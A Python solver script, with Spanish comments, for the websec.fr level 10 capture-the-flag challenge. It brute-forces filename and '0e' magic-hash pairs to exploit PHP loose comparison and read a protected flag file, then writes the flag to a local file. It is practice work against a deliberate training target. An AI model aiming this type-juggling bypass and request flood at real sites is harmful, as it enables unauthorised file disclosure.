#!/usr/bin/env python3
import requests
import time

url = "https://websec.fr/level10/index.php"

# Filenames que generan hashes 0e con ALGÚN flag
magic_filenames = [
    'Gfflag.php', 'Nzflag.php', 'Twflag.php', 'a3vflag.php', 'cfkflag.php',
    'je9flag.php', 'eMflag.php', 'zqflag.php', 'XDflag.php', 'Y5flag.php',
    '3Qflag.php', 'ay6flag.php', 'bdiflag.php', 'blrflag.php', 'bo9flag.php',
    'bu.flag.php', 'ckgflag.php', 'c5uflag.php', 'da4flag.php', 'd.3flag.php',
    'eziflag.php', 'fbxflag.php', 'fhcflag.php', 'flpflag.php', 'foxflag.php',
    'furflag.php', 'g4fflag.php', 'hbaflag.php', 'hbyflag.php', 'hgkflag.php',
    'hhpflag.php', 'hnwflag.php', 'h6hflag.php', 'i9zflag.php', 'jgiflag.php',
    'jk9flag.php', 'jq6flag.php', 'j75flag.php', 'k//flag.php', 'l02flag.php',
    'l3bflag.php', 'l9hflag.php', 'mc6flag.php', 'm59flag.php', 'm-sflag.php'
]

# Hashes 0e mágicos conocidos
magic_hashes = [
    "0e215962017", "0e730083352", "0e462097431", "0e830400451", 
    "0e545993274", "0e342768416", "0e174594266", "0e509366587",
    "0e001233333", "0e999999999", "0e123456789", "0e000000001",
]

# También agregar los hashes que generé localmente
for i in range(1000):
    magic_hashes.append(f"0e{i:06d}")

print(f"Probando {len(magic_filenames)} filenames con {len(magic_hashes)} hashes 0e...")
print("="*60 + "\n")

tested = 0
for filename in magic_filenames:
    print(f"Probando filename: {filename}")
    
    for hash_val in magic_hashes:
        try:
            r = requests.get(url, params={"f": filename, "hash": hash_val}, timeout=3)
            
            if "WEBSEC{" in r.text:
                flag_start = r.text.find("WEBSEC{")
                flag_end = r.text.find("}", flag_start)
                if flag_end > flag_start:
                    flag = r.text[flag_start:flag_end+1]
                    print(f"\n{'='*60}")
                    print(f"¡¡¡FLAG ENCONTRADA!!!")
                    print(f"{'='*60}")
                    print(f"FLAG: {flag}")
                    print(f"Filename: {filename}")
                    print(f"Hash: {hash_val}")
                    
                    with open("/workspace/websec_level10/FLAG.txt", "w") as f:
                        f.write(f"FLAG: {flag}\nFilename: {filename}\nHash: {hash_val}\n")
                    
                    exit(0)
            
            tested += 1
            if tested % 1000 == 0:
                print(f"  Probados: {tested:,}")
        
        except:
            continue
        
        if tested % 50 == 0:
            time.sleep(0.01)

print(f"\nTotal probados: {tested:,}")
print("No encontrado.")